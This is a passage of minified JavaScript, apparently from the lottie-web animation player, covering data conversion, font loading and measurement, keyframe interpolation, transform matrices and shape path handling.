r,s=e.assets.length;for(r=0;r<s;r+=1)e.assets[r].layers&&i(e.assets[r].layers)}}}(),a=(s=[4,7,99],function(t){if(t.chars&&!n(s,t.v)){var e,i,o,a,l,h=t.chars.length;for(e=0;e<h;e+=1)if(t.chars[e].data&&t.chars[e].data.shapes)for(o=(l=t.chars[e].data.shapes[0].it).length,i=0;i<o;i+=1)(a=l[i].ks.k).__converted||(r(l[i].ks.k),a.__converted=!0)}}),l=function(){var t=[4,1,9];function e(t){var i,r,n,s=t.length;for(i=0;i<s;i+=1)if("gr"===t[i].ty)e(t[i].it);else if("fl"===t[i].ty||"st"===t[i].ty)if(t[i].c.k&&t[i].c.k[0].i)for(n=t[i].c.k.length,r=0;r<n;r+=1)t[i].c.k[r].s&&(t[i].c.k[r].s[0]/=255,t[i].c.k[r].s[1]/=255,t[i].c.k[r].s[2]/=255,t[i].c.k[r].s[3]/=255),t[i].c.k[r].e&&(t[i].c.k[r].e[0]/=255,t[i].c.k[r].e[1]/=255,t[i].c.k[r].e[2]/=255,t[i].c.k[r].e[3]/=255);else t[i].c.k[0]/=255,t[i].c.k[1]/=255,t[i].c.k[2]/=255,t[i].c.k[3]/=255}function i(t){var i,r=t.length;for(i=0;i<r;i+=1)4===t[i].ty&&e(t[i].shapes)}return function(e){if(n(t,e.v)&&(i(e.layers),e.assets)){var r,s=e.assets.length;for(r=0;r<s;r+=1)e.assets[r].layers&&i(e.assets[r].layers)}}}(),h=function(){var t=[4,4,18];function e(t){var i,r,n;for(i=t.length-1;i>=0;i-=1)if("sh"==t[i].ty)if(t[i].ks.k.i)t[i].ks.k.c=t[i].closed;else for(n=t[i].ks.k.length,r=0;r<n;r+=1)t[i].ks.k[r].s&&(t[i].ks.k[r].s[0].c=t[i].closed),t[i].ks.k[r].e&&(t[i].ks.k[r].e[0].c=t[i].closed);else"gr"==t[i].ty&&e(t[i].it)}function i(t){var i,r,n,s,o,a,l=t.length;for(r=0;r<l;r+=1){if((i=t[r]).hasMask){var h=i.masksProperties;for(s=h.length,n=0;n<s;n+=1)if(h[n].pt.k.i)h[n].pt.k.c=h[n].cl;else for(a=h[n].pt.k.length,o=0;o<a;o+=1)h[n].pt.k[o].s&&(h[n].pt.k[o].s[0].c=h[n].cl),h[n].pt.k[o].e&&(h[n].pt.k[o].e[0].c=h[n].cl)}4===i.ty&&e(i.shapes)}}return function(e){if(n(t,e.v)&&(i(e.layers),e.assets)){var r,s=e.assets.length;for(r=0;r<s;r+=1)e.assets[r].layers&&i(e.assets[r].layers)}}}();function c(t,e){0===t.t.a.length&&!("m"in t.t.p)&&(t.singleShape=!0)}var u={completeData:function(e,i){e.__complete||(l(e),o(e),a(e),h(e),t(e.layers,e.assets,i),e.__complete=!0)}};return u.checkColors=l,u.checkChars=a,u.checkShapes=h,u.completeLayers=t,u}var dataManager=dataFunctionManager(),FontManager=function(){var t={w:0,size:0,shapes:[]},e=[];function i(t,e){var i=createTag("span");i.style.fontFamily=e;var r=createTag("span");r.innerHTML="giItT1WQy@!-/#",i.style.position="absolute",i.style.left="-10000px",i.style.top="-10000px",i.style.fontSize="300px",i.style.fontVariant="normal",i.style.fontStyle="normal",i.style.fontWeight="normal",i.style.letterSpacing="0",i.appendChild(r),document.body.appendChild(i);var n=r.offsetWidth;return r.style.fontFamily=function(t){var e,i=t.split(","),r=i.length,n=[];for(e=0;e<r;e+=1)"sans-serif"!==i[e]&&"monospace"!==i[e]&&n.push(i[e]);return n.join(",")}(t)+", "+e,{node:r,w:n,parent:i}}function r(t,e){var i=createNS("text");return i.style.fontSize="100px",i.setAttribute("font-family",e.fFamily),i.setAttribute("font-style",e.fStyle),i.setAttribute("font-weight",e.fWeight),i.textContent="1",e.fClass?(i.style.fontFamily="inherit",i.setAttribute("class",e.fClass)):i.style.fontFamily=e.fFamily,t.appendChild(i),createTag("canvas").getContext("2d").font=e.fWeight+" "+e.fStyle+" 100px "+e.fFamily,i}e=e.concat([2304,2305,2306,2307,2362,2363,2364,2364,2366,2367,2368,2369,2370,2371,2372,2373,2374,2375,2376,2377,2378,2379,2380,2381,2382,2383,2387,2388,2389,2390,2391,2402,2403]);var n=function(){this.fonts=[],this.chars=null,this.typekitLoaded=0,this.isLoaded=!1,this.initTime=Date.now(),this.setIsLoadedBinded=this.setIsLoaded.bind(this),this.checkLoadedFontsBinded=this.checkLoadedFonts.bind(this)};return n.getCombinedCharacterCodes=function(){return e},n.prototype={addChars:function(t){if(t){this.chars||(this.chars=[]);var e,i,r,n=t.length,s=this.chars.length;for(e=0;e<n;e+=1){for(i=0,r=!1;i<s;)this.chars[i].style===t[e].style&&this.chars[i].fFamily===t[e].fFamily&&this.chars[i].ch===t[e].ch&&(r=!0),i+=1;r||(this.chars.push(t[e]),s+=1)}}},addFonts:function(t,e){if(t){if(this.chars)return this.isLoaded=!0,void(this.fonts=t.list);var n,s=t.list,o=s.length,a=o;for(n=0;n<o;n+=1){var l,h,c=!0;if(s[n].loaded=!1,s[n].monoCase=i(s[n].fFamily,"monospace"),s[n].sansCase=i(s[n].fFamily,"sans-serif"),s[n].fPath){if("p"===s[n].fOrigin||3===s[n].origin){if((l=document.querySelectorAll('style[f-forigin="p"][f-family="'+s[n].fFamily+'"], style[f-origin="3"][f-family="'+s[n].fFamily+'"]')).length>0&&(c=!1),c){var u=createTag("style");u.setAttribute("f-forigin",s[n].fOrigin),u.setAttribute("f-origin",s[n].origin),u.setAttribute("f-family",s[n].fFamily),u.type="text/css",u.innerHTML="@font-face {font-family: "+s[n].fFamily+"; font-style: normal; src: url('"+s[n].fPath+"');}",e.appendChild(u)}}else if("g"===s[n].fOrigin||1===s[n].origin){for(l=document.querySelectorAll('link[f-forigin="g"], link[f-origin="1"]'),h=0;h<l.length;h++)-1!==l[h].href.indexOf(s[n].fPath)&&(c=!1);if(c){var d=createTag("link");d.setAttribute("f-forigin",s[n].fOrigin),d.setAttribute("f-origin",s[n].origin),d.type="text/css",d.rel="stylesheet",d.href=s[n].fPath,document.body.appendChild(d)}}else if("t"===s[n].fOrigin||2===s[n].origin){for(l=document.querySelectorAll('script[f-forigin="t"], script[f-origin="2"]'),h=0;h<l.length;h++)s[n].fPath===l[h].src&&(c=!1);if(c){var p=createTag("link");p.setAttribute("f-forigin",s[n].fOrigin),p.setAttribute("f-origin",s[n].origin),p.setAttribute("rel","stylesheet"),p.setAttribute("href",s[n].fPath),e.appendChild(p)}}}else s[n].loaded=!0,a-=1;s[n].helper=r(e,s[n]),s[n].cache={},this.fonts.push(s[n])}0===a?this.isLoaded=!0:setTimeout(this.checkLoadedFonts.bind(this),100)}else this.isLoaded=!0},getCharData:function(e,i,r){for(var n=0,s=this.chars.length;n<s;){if(this.chars[n].ch===e&&this.chars[n].style===i&&this.chars[n].fFamily===r)return this.chars[n];n+=1}return("string"==typeof e&&13!==e.charCodeAt(0)||!e)&&console&&console.warn&&console.warn("Missing character from exported characters list: ",e,i,r),t},getFontByName:function(t){for(var e=0,i=this.fonts.length;e<i;){if(this.fonts[e].fName===t)return this.fonts[e];e+=1}return this.fonts[0]},measureText:function(t,e,i){var r=this.getFontByName(e),n=t.charCodeAt(0);if(!r.cache[n+1]){var s=r.helper;if(" "===t){s.textContent="|"+t+"|";var o=s.getComputedTextLength();s.textContent="||";var a=s.getComputedTextLength();r.cache[n+1]=(o-a)/100}else s.textContent=t,r.cache[n+1]=s.getComputedTextLength()/100}return r.cache[n+1]*i},checkLoadedFonts:function(){var t,e,i,r=this.fonts.length,n=r;for(t=0;t<r;t+=1)this.fonts[t].loaded?n-=1:"n"===this.fonts[t].fOrigin||0===this.fonts[t].origin?this.fonts[t].loaded=!0:(e=this.fonts[t].monoCase.node,i=this.fonts[t].monoCase.w,e.offsetWidth!==i?(n-=1,this.fonts[t].loaded=!0):(e=this.fonts[t].sansCase.node,i=this.fonts[t].sansCase.w,e.offsetWidth!==i&&(n-=1,this.fonts[t].loaded=!0)),this.fonts[t].loaded&&(this.fonts[t].sansCase.parent.parentNode.removeChild(this.fonts[t].sansCase.parent),this.fonts[t].monoCase.parent.parentNode.removeChild(this.fonts[t].monoCase.parent)));0!==n&&Date.now()-this.initTime<5e3?setTimeout(this.checkLoadedFontsBinded,20):setTimeout(this.setIsLoadedBinded,10)},setIsLoaded:function(){this.isLoaded=!0}},n}(),PropertyFactory=function(){var t=initialDefaultFrame,e=Math.abs;function i(t,e){var i,n=this.offsetTime;"multidimensional"===this.propType&&(i=createTypedArray("float32",this.pv.length));for(var s,o,a=e.lastIndex,l=a,h=this.keyframes.length-1,c=!0;c;){if(s=this.keyframes[l],o=this.keyframes[l+1],l===h-1&&t>=o.t-n){s.h&&(s=o),a=0;break}if(o.t-n>t){a=l;break}l<h-1?l+=1:(a=0,c=!1)}var u,d,p,m,f,g,y,v=o.t-n,_=s.t-n;if(s.to){s.bezierData||(s.bezierData=bez.buildBezierData(s.s,o.s||s.e,s.to,s.ti));var b=s.bezierData;if(t>=v||t<_){var w=t>=v?b.points.length-1:0;for(d=b.points[w].point.length,u=0;u<d;u+=1)i[u]=b.points[w].point[u]}else{s.__fnct?g=s.__fnct:(g=BezierFactory.getBezierEasing(s.o.x,s.o.y,s.i.x,s.i.y,s.n).get,s.__fnct=g),p=g((t-_)/(v-_));var E,S=b.segmentLength*p,A=e.lastFrame<t&&e._lastKeyframeIndex===l?e._lastAddedLength:0;for(f=e.lastFrame<t&&e._lastKeyframeIndex===l?e._lastPoint:0,c=!0,m=b.points.length;c;){if(A+=b.points[f].partialLength,0===S||0===p||f===b.points.length-1){for(d=b.points[f].point.length,u=0;u<d;u+=1)i[u]=b.points[f].point[u];break}if(S>=A&&S<A+b.points[f+1].partialLength){for(E=(S-A)/b.points[f+1].partialLength,d=b.points[f].point.length,u=0;u<d;u+=1)i[u]=b.points[f].point[u]+(b.points[f+1].point[u]-b.points[f].point[u])*E;break}f<m-1?f+=1:c=!1}e._lastPoint=f,e._lastAddedLength=A-b.points[f].partialLength,e._lastKeyframeIndex=l}}else{var C,T,$,I,P;if(h=s.s.length,y=o.s||s.e,this.sh&&1!==s.h)t>=v?(i[0]=y[0],i[1]=y[1],i[2]=y[2]):t<=_?(i[0]=s.s[0],i[1]=s.s[1],i[2]=s.s[2]):function(t,e){var i=e[0],r=e[1],n=e[2],s=e[3],o=Math.atan2(2*r*s-2*i*n,1-2*r*r-2*n*n),a=Math.asin(2*i*r+2*n*s),l=Math.atan2(2*i*s-2*r*n,1-2*i*i-2*n*n);t[0]=o/degToRads,t[1]=a/degToRads,t[2]=l/degToRads}(i,function(t,e,i){var r,n,s,o,a,l=[],h=t[0],c=t[1],u=t[2],d=t[3],p=e[0],m=e[1],f=e[2],g=e[3];return(n=h*p+c*m+u*f+d*g)<0&&(n=-n,p=-p,m=-m,f=-f,g=-g),1-n>1e-6?(r=Math.acos(n),s=Math.sin(r),o=Math.sin((1-i)*r)/s,a=Math.sin(i*r)/s):(o=1-i,a=i),l[0]=o*h+a*p,l[1]=o*c+a*m,l[2]=o*u+a*f,l[3]=o*d+a*g,l}(r(s.s),r(y),(t-_)/(v-_)));else for(l=0;l<h;l+=1)1!==s.h&&(t>=v?p=1:t<_?p=0:(s.o.x.constructor===Array?(s.__fnct||(s.__fnct=[]),s.__fnct[l]?g=s.__fnct[l]:(C=void 0===s.o.x[l]?s.o.x[0]:s.o.x[l],T=void 0===s.o.y[l]?s.o.y[0]:s.o.y[l],$=void 0===s.i.x[l]?s.i.x[0]:s.i.x[l],I=void 0===s.i.y[l]?s.i.y[0]:s.i.y[l],g=BezierFactory.getBezierEasing(C,T,$,I).get,s.__fnct[l]=g)):s.__fnct?g=s.__fnct:(C=s.o.x,T=s.o.y,$=s.i.x,I=s.i.y,g=BezierFactory.getBezierEasing(C,T,$,I).get,s.__fnct=g),p=g((t-_)/(v-_)))),y=o.s||s.e,P=1===s.h?s.s[l]:s.s[l]+(y[l]-s.s[l])*p,"multidimensional"===this.propType?i[l]=P:i=P}return e.lastIndex=a,i}function r(t){var e=t[0]*degToRads,i=t[1]*degToRads,r=t[2]*degToRads,n=Math.cos(e/2),s=Math.cos(i/2),o=Math.cos(r/2),a=Math.sin(e/2),l=Math.sin(i/2),h=Math.sin(r/2);return[a*l*o+n*s*h,a*s*o+n*l*h,n*l*o-a*s*h,n*s*o-a*l*h]}function n(){var e=this.comp.renderedFrame-this.offsetTime,i=this.keyframes[0].t-this.offsetTime,r=this.keyframes[this.keyframes.length-1].t-this.offsetTime;if(!(e===this._caching.lastFrame||this._caching.lastFrame!==t&&(this._caching.lastFrame>=r&&e>=r||this._caching.lastFrame<i&&e<i))){this._caching.lastFrame>=e&&(this._caching._lastKeyframeIndex=-1,this._caching.lastIndex=0);var n=this.interpolateValue(e,this._caching);this.pv=n}return this._caching.lastFrame=e,this.pv}function s(t){var i;if("unidimensional"===this.propType)i=t*this.mult,e(this.v-i)>1e-5&&(this.v=i,this._mdf=!0);else for(var r=0,n=this.v.length;r<n;)i=t[r]*this.mult,e(this.v[r]-i)>1e-5&&(this.v[r]=i,this._mdf=!0),r+=1}function o(){if(this.elem.globalData.frameId!==this.frameId&&this.effectsSequence.length){if(this.lock)return void this.setVValue(this.pv);this.lock=!0,this._mdf=this._isFirstFrame;var t,e=this.effectsSequence.length,i=this.kf?this.pv:this.data.k;for(t=0;t<e;t+=1)i=this.effectsSequence[t](i);this.setVValue(i),this._isFirstFrame=!1,this.lock=!1,this.frameId=this.elem.globalData.frameId}}function a(t){this.effectsSequence.push(t),this.container.addDynamicProperty(this)}function l(t,e,i,r){this.propType="unidimensional",this.mult=i||1,this.data=e,this.v=i?e.k*i:e.k,this.pv=e.k,this._mdf=!1,this.elem=t,this.container=r,this.comp=t.comp,this.k=!1,this.kf=!1,this.vel=0,this.effectsSequence=[],this._isFirstFrame=!0,this.getValue=o,this.setVValue=s,this.addEffect=a}function h(t,e,i,r){this.propType="multidimensional",this.mult=i||1,this.data=e,this._mdf=!1,this.elem=t,this.container=r,this.comp=t.comp,this.k=!1,this.kf=!1,this.frameId=-1;var n,l=e.k.length;for(this.v=createTypedArray("float32",l),this.pv=createTypedArray("float32",l),createTypedArray("float32",l),this.vel=createTypedArray("float32",l),n=0;n<l;n+=1)this.v[n]=e.k[n]*this.mult,this.pv[n]=e.k[n];this._isFirstFrame=!0,this.effectsSequence=[],this.getValue=o,this.setVValue=s,this.addEffect=a}function c(e,r,l,h){this.propType="unidimensional",this.keyframes=r.k,this.offsetTime=e.data.st,this.frameId=-1,this._caching={lastFrame:t,lastIndex:0,value:0,_lastKeyframeIndex:-1},this.k=!0,this.kf=!0,this.data=r,this.mult=l||1,this.elem=e,this.container=h,this.comp=e.comp,this.v=t,this.pv=t,this._isFirstFrame=!0,this.getValue=o,this.setVValue=s,this.interpolateValue=i,this.effectsSequence=[n.bind(this)],this.addEffect=a}function u(e,r,l,h){this.propType="multidimensional";var c,u,d,p,m,f=r.k.length;for(c=0;c<f-1;c+=1)r.k[c].to&&r.k[c].s&&r.k[c+1]&&r.k[c+1].s&&(u=r.k[c].s,d=r.k[c+1].s,p=r.k[c].to,m=r.k[c].ti,(2===u.length&&!(u[0]===d[0]&&u[1]===d[1])&&bez.pointOnLine2D(u[0],u[1],d[0],d[1],u[0]+p[0],u[1]+p[1])&&bez.pointOnLine2D(u[0],u[1],d[0],d[1],d[0]+m[0],d[1]+m[1])||3===u.length&&!(u[0]===d[0]&&u[1]===d[1]&&u[2]===d[2])&&bez.pointOnLine3D(u[0],u[1],u[2],d[0],d[1],d[2],u[0]+p[0],u[1]+p[1],u[2]+p[2])&&bez.pointOnLine3D(u[0],u[1],u[2],d[0],d[1],d[2],d[0]+m[0],d[1]+m[1],d[2]+m[2]))&&(r.k[c].to=null,r.k[c].ti=null),u[0]===d[0]&&u[1]===d[1]&&0===p[0]&&0===p[1]&&0===m[0]&&0===m[1]&&(2===u.length||u[2]===d[2]&&0===p[2]&&0===m[2])&&(r.k[c].to=null,r.k[c].ti=null));this.effectsSequence=[n.bind(this)],this.keyframes=r.k,this.offsetTime=e.data.st,this.k=!0,this.kf=!0,this._isFirstFrame=!0,this.mult=l||1,this.elem=e,this.container=h,this.comp=e.comp,this.getValue=o,this.setVValue=s,this.interpolateValue=i,this.frameId=-1;var g=r.k[0].s.length;for(this.v=createTypedArray("float32",g),this.pv=createTypedArray("float32",g),c=0;c<g;c+=1)this.v[c]=t,this.pv[c]=t;this._caching={lastFrame:t,lastIndex:0,value:createTypedArray("float32",g)},this.addEffect=a}return{getProp:function(t,e,i,r,n){var s;if(e.k.length)if("number"==typeof e.k[0])s=new h(t,e,r,n);else switch(i){case 0:s=new c(t,e,r,n);break;case 1:s=new u(t,e,r,n)}else s=new l(t,e,r,n);return s.effectsSequence.length&&n.addDynamicProperty(s),s}}}(),TransformPropertyFactory=function(){var t=[0,0];function e(t,e,i){if(this.elem=t,this.frameId=-1,this.propType="transform",this.data=e,this.v=new Matrix,this.pre=new Matrix,this.appliedTransformations=0,this.initDynamicPropertyContainer(i||t),e.p&&e.p.s?(this.px=PropertyFactory.getProp(t,e.p.x,0,0,this),this.py=PropertyFactory.getProp(t,e.p.y,0,0,this),e.p.z&&(this.pz=PropertyFactory.getProp(t,e.p.z,0,0,this))):this.p=PropertyFactory.getProp(t,e.p||{k:[0,0,0]},1,0,this),e.rx){if(this.rx=PropertyFactory.getProp(t,e.rx,0,degToRads,this),this.ry=PropertyFactory.getProp(t,e.ry,0,degToRads,this),this.rz=PropertyFactory.getProp(t,e.rz,0,degToRads,this),e.or.k[0].ti){var r,n=e.or.k.length;for(r=0;r<n;r+=1)e.or.k[r].to=e.or.k[r].ti=null}this.or=PropertyFactory.getProp(t,e.or,1,degToRads,this),this.or.sh=!0}else this.r=PropertyFactory.getProp(t,e.r||{k:0},0,degToRads,this);e.sk&&(this.sk=PropertyFactory.getProp(t,e.sk,0,degToRads,this),this.sa=PropertyFactory.getProp(t,e.sa,0,degToRads,this)),this.a=PropertyFactory.getProp(t,e.a||{k:[0,0,0]},1,0,this),this.s=PropertyFactory.getProp(t,e.s||{k:[100,100,100]},1,.01,this),e.o?this.o=PropertyFactory.getProp(t,e.o,0,.01,t):this.o={_mdf:!1,v:1},this._isDirty=!0,this.dynamicProperties.length||this.getValue(!0)}return e.prototype={applyToMatrix:function(t){var e=this._mdf;this.iterateDynamicProperties(),this._mdf=this._mdf||e,this.a&&t.translate(-this.a.v[0],-this.a.v[1],this.a.v[2]),this.s&&t.scale(this.s.v[0],this.s.v[1],this.s.v[2]),this.sk&&t.skewFromAxis(-this.sk.v,this.sa.v),this.r?t.rotate(-this.r.v):t.rotateZ(-this.rz.v).rotateY(this.ry.v).rotateX(this.rx.v).rotateZ(-this.or.v[2]).rotateY(this.or.v[1]).rotateX(this.or.v[0]),this.data.p.s?this.data.p.z?t.translate(this.px.v,this.py.v,-this.pz.v):t.translate(this.px.v,this.py.v,0):t.translate(this.p.v[0],this.p.v[1],-this.p.v[2])},getValue:function(e){if(this.elem.globalData.frameId!==this.frameId){if(this._isDirty&&(this.precalculateMatrix(),this._isDirty=!1),this.iterateDynamicProperties(),this._mdf||e){if(this.v.cloneFromProps(this.pre.props),this.appliedTransformations<1&&this.v.translate(-this.a.v[0],-this.a.v[1],this.a.v[2]),this.appliedTransformations<2&&this.v.scale(this.s.v[0],this.s.v[1],this.s.v[2]),this.sk&&this.appliedTransformations<3&&this.v.skewFromAxis(-this.sk.v,this.sa.v),this.r&&this.appliedTransformations<4?this.v.rotate(-this.r.v):!this.r&&this.appliedTransformations<4&&this.v.rotateZ(-this.rz.v).rotateY(this.ry.v).rotateX(this.rx.v).rotateZ(-this.or.v[2]).rotateY(this.or.v[1]).rotateX(this.or.v[0]),this.autoOriented){var i,r,n=this.elem.globalData.frameRate;if(this.p&&this.p.keyframes&&this.p.getValueAtTime)this.p._caching.lastFrame+this.p.offsetTime<=this.p.keyframes[0].t?(i=this.p.getValueAtTime((this.p.keyframes[0].t+.01)/n,0),r=this.p.getValueAtTime(this.p.keyframes[0].t/n,0)):this.p._caching.lastFrame+this.p.offsetTime>=this.p.keyframes[this.p.keyframes.length-1].t?(i=this.p.getValueAtTime(this.p.keyframes[this.p.keyframes.length-1].t/n,0),r=this.p.getValueAtTime((this.p.keyframes[this.p.keyframes.length-1].t-.05)/n,0)):(i=this.p.pv,r=this.p.getValueAtTime((this.p._caching.lastFrame+this.p.offsetTime-.01)/n,this.p.offsetTime));else if(this.px&&this.px.keyframes&&this.py.keyframes&&this.px.getValueAtTime&&this.py.getValueAtTime){i=[],r=[];var s=this.px,o=this.py;s._caching.lastFrame+s.offsetTime<=s.keyframes[0].t?(i[0]=s.getValueAtTime((s.keyframes[0].t+.01)/n,0),i[1]=o.getValueAtTime((o.keyframes[0].t+.01)/n,0),r[0]=s.getValueAtTime(s.keyframes[0].t/n,0),r[1]=o.getValueAtTime(o.keyframes[0].t/n,0)):s._caching.lastFrame+s.offsetTime>=s.keyframes[s.keyframes.length-1].t?(i[0]=s.getValueAtTime(s.keyframes[s.keyframes.length-1].t/n,0),i[1]=o.getValueAtTime(o.keyframes[o.keyframes.length-1].t/n,0),r[0]=s.getValueAtTime((s.keyframes[s.keyframes.length-1].t-.01)/n,0),r[1]=o.getValueAtTime((o.keyframes[o.keyframes.length-1].t-.01)/n,0)):(i=[s.pv,o.pv],r[0]=s.getValueAtTime((s._caching.lastFrame+s.offsetTime-.01)/n,s.offsetTime),r[1]=o.getValueAtTime((o._caching.lastFrame+o.offsetTime-.01)/n,o.offsetTime))}else i=r=t;this.v.rotate(-Math.atan2(i[1]-r[1],i[0]-r[0]))}this.data.p&&this.data.p.s?this.data.p.z?this.v.translate(this.px.v,this.py.v,-this.pz.v):this.v.translate(this.px.v,this.py.v,0):this.v.translate(this.p.v[0],this.p.v[1],-this.p.v[2])}this.frameId=this.elem.globalData.frameId}},precalculateMatrix:function(){if(!this.a.k&&(this.pre.translate(-this.a.v[0],-this.a.v[1],this.a.v[2]),this.appliedTransformations=1,!this.s.effectsSequence.length)){if(this.pre.scale(this.s.v[0],this.s.v[1],this.s.v[2]),this.appliedTransformations=2,this.sk){if(this.sk.effectsSequence.length||this.sa.effectsSequence.length)return;this.pre.skewFromAxis(-this.sk.v,this.sa.v),this.appliedTransformations=3}if(this.r){if(this.r.effectsSequence.length)return;this.pre.rotate(-this.r.v),this.appliedTransformations=4}else!this.rz.effectsSequence.length&&!this.ry.effectsSequence.length&&!this.rx.effectsSequence.length&&!this.or.effectsSequence.length&&(this.pre.rotateZ(-this.rz.v).rotateY(this.ry.v).rotateX(this.rx.v).rotateZ(-this.or.v[2]).rotateY(this.or.v[1]).rotateX(this.or.v[0]),this.appliedTransformations=4)}},autoOrient:function(){}},extendPrototype([DynamicPropertyContainer],e),e.prototype.addDynamicProperty=function(t){this._addDynamicProperty(t),this.elem.addDynamicProperty(t),this._isDirty=!0},e.prototype._addDynamicProperty=DynamicPropertyContainer.prototype.addDynamicProperty,{getTransformProperty:function(t,i,r){return new e(t,i,r)}}}();function ShapePath(){this.c=!1,this._length=0,this._maxLength=8,this.v=createSizedArray(this._maxLength),this.o=createSizedArray(this._maxLength),this.i=createSizedArray(this._maxLength)}ShapePath.prototype.setPathData=function(t,e){this.c=t,this.setLength(e);for(var i=0;i<e;)this.v[i]=point_pool.newElement(),this.o[i]=point_pool.newElement(),this.i[i]=point_pool.newElement(),i+=1},ShapePath.prototype.setLength=function(t){for(;this._maxLength<t;)this.doubleArrayLength();this._length=t},ShapePath.prototype.doubleArrayLength=function(){this.v=this.v.concat(createSizedArray(this._maxLength)),this.i=this.i.concat(createSizedArray(this._maxLength)),this.o=this.o.concat(createSizedArray(this._maxLength)),this._maxLength*=2},ShapePath.prototype.setXYAt=function(t,e,i,r,n){var s;switch(this._length=Math.max(this._length,r+1),this._length>=this._maxLength&&this.doubleArrayLength(),i){case"v":s=this.v;break;case"i":s=this.i;break;case"o":s=this.o}(!s[r]||s[r]&&!n)&&(s[r]=point_pool.newElement()),s[r][0]=t,s[r][1]=e},ShapePath.prototype.setTripleAt=function(t,e,i,r,n,s,o,a){this.setXYAt(t,e,"v",o,a),this.setXYAt(i,r,"o",o,a),this.setXYAt(n,s,"i",o,a)},ShapePath.prototype.reverse=function(){var t=new ShapePath;t.setPathData(this.c,this._length);var e=this.v,i=this.o,r=this.i,n=0;this.c&&(t.setTripleAt(e[0][0],e[0][1],r[0][0],r[0][1],i[0][0],i[0][1],0,!1),n=1);var s,o=this._length-1,a=this._length;for(s=n;s<a;s+=1)t.setTripleAt(e[o][0],e[o][1],r[o][0],r[o][1],i[o][0],i[o][1],s,!1),o-=1;return t};var ShapePropertyFactory=function(){var t=-999999;function e(t,e,i){var r,n,s,o,a,l,h,c,u,d=i.lastIndex,p=this.keyframes;if(t<p[0].t-this.offsetTime)r=p[0].s[0],s=!0,d=0;else if(t>=p[p.length-1].t-this.offsetTime)r=p[p.length-1].s?p[p.length-1].s[0]:p[p.length-2].e[0],s=!0;else{for(var m,f,g=d,y=p.length-1,v=!0;v&&(m=p[g],!((f=p[g+1]).t-this.offsetTime>t));)g<y-1?g+=1:v=!1;if(d=g,!(s=1===m.h)){if(t>=f.t-this.offsetTime)c=1;else if(t<m.t-this.offsetTime)c=0;else{var _;m.__fnct?_=m.__fnct:(_=BezierFactory.getBezierEasing(m.o.x,m.o.y,m.i.x,m.i.y).get,m.__fnct=_),c=_((t-(m.t-this.offsetTime))/(f.t-this.offsetTime-(m.t-this.offsetTime)))}n=f.s?f.s[0]:m.e[0]}r=m.s[0]}for(l=e._length,h=r.i[0].length,i.lastIndex=d,o=0;o<l;o+=1)for(a=0;a<h;a+=1)u=s?r.i[o][a]:r.i[o][a]+(n.i[o][a]-r.i[o][a])*c,e.i[o][a]=u,u=s?r.o[o][a]:r.o[o][a]+(n.o[o][a]-r.o[o][a])*c,e.o[o][a]=u,u=s?r.v[o][a]:r.v[o][a]+(n.v[o][a]-r.v[o][a])*c,e.v[o][a]=u}function i(){var e=this.comp.renderedFrame-this.offsetTime,i=this.keyframes[0].t-this.offsetTime,r=this.keyframes[this.keyframes.length-1].t-this.offsetTime,n=this._caching.lastFrame;return n!==t&&(n<i&&e<i||n>r&&e>r)||(this._caching.lastIndex=n<e?this._caching.lastIndex:0,this.interpolateShape(e,this.pv,this._caching)),this._caching.lastFrame=e,this.pv}function r(){this.paths=this.localShapeCollection}function n(t){(function(t,e){if(t._length!==e._length||t.c!==e.c)return!1;var i,r=t._length;for(i=0;i<r;i+=1)if(t.v[i][0]!==e.v[i][0]||t.v[i][1]!==e.v[i][1]||t.o[i][0]!==e.o[i][0]||t.o[i][1]!==e.o[i][1]||t.i[i][0]!==e.i[i][0]||t.i[i][1]!==e.i[i][1])return!1;return!0})(this.v,t)||(this.v=shape_pool.clone(t),this.localShapeCollection.releaseShapes(),this.localShapeCollection.addShape(this.v),this._mdf=!0,this.paths=this.localShapeCollection)}function s(){if(this.elem.globalData.frameId!==this.frameId){if(!this.effectsSequence.length)return void(this._mdf=!1);if(this.lock)return void this.setVValue(this.pv);this.lock=!0,this._mdf=!1;var t,e=this.kf?this.pv:this.data.ks?this.data.ks.k:this.data.pt.k,i=this.effectsSequence.length;for(t=0;t<i;t+=1)e=this.effectsSequence[t](e);this.setVValue(e),this.lock=!1,this.frameId=this.elem.globalData.frameId}}function o(t,e,i){this.propType="shape",this.comp=t.comp,this.container=t,this.elem=t,this.data=e,this.k=!1,this.kf=!1,this._mdf=!1;var n=3===i?e.pt.k:e.ks.k;this.v=shape_pool.clone(n),this.pv=shape_pool.clone(this.v),this.localShapeCollection=shapeCollection_pool.newShapeCollection(),this.paths=this.localShapeCollection,this.paths.addShape(this.v),this.reset=r,this.effectsSequence=[]}function a(t){this.effectsSequence.push(t),this.container.addDynamicProperty(this)}function l(e,n,s){this.propType="shape",this.comp=e.comp,this.elem=e,this.container=e,this.offsetTime=e.data.st,this.keyframes=3===s?n.pt.k:n.ks.k,this.k=!0,this.kf=!0;var o=this.keyframes[0].s[0].i.length;this.keyframes[0].s[0].i[0].length,this.v=shape_pool.newElement(),this.v.setPathData(this.keyframes[0].s[0].c,o),this.pv=shape_pool.clone(this.v),this.localShapeCollection=shapeCollection_pool.newShapeCollection(),this.paths=this.localShapeCollection,this.paths.addShape(this.v),this.lastFrame=t,this.reset=r,this._caching={lastFrame:t,lastIndex:0},this.effectsSequence=[i.bind(this)]}o.prototype.interpolateShape=e,o.prototype.getValue=s,o.prototype.setVValue=n,o.prototype.addEffect=a,l.prototype.getValue=s,l.prototype.interpolateShape=e,l.prototype.setVValue=n,l.prototype.addEffect=a;var h=function(){var t=roundCorner;function e(t,e){this.v=shape_pool.newElement(),this.v.setPathData(!0,4),this.localShapeCollection=shapeCollection_pool.newShapeCollection(),this.paths=this.localShapeCollection,this.localShapeCollection.addShape(this.v),this.d=e.d,this.elem=t,this.comp=t.comp,this.frameId=-1,this.initDynamicPropertyContainer(t),this.p=PropertyFactory.getProp(t,e.p,1,0,this),this.s=PropertyFactory.getProp(t,e.s,1,0,this),this.dynamicProperties.length?this.k=!0:(this.k=!1,this.convertEllToPath())}return e.prototype={reset:r,getValue:function(){this.elem.globalData.frameId!==this.frameId&&(this.frameId=this.elem.globalData.frameId,this.iterateDynamicProperties(),this._mdf&&this.convertEllToPath())},convertEllToPath:function(){var 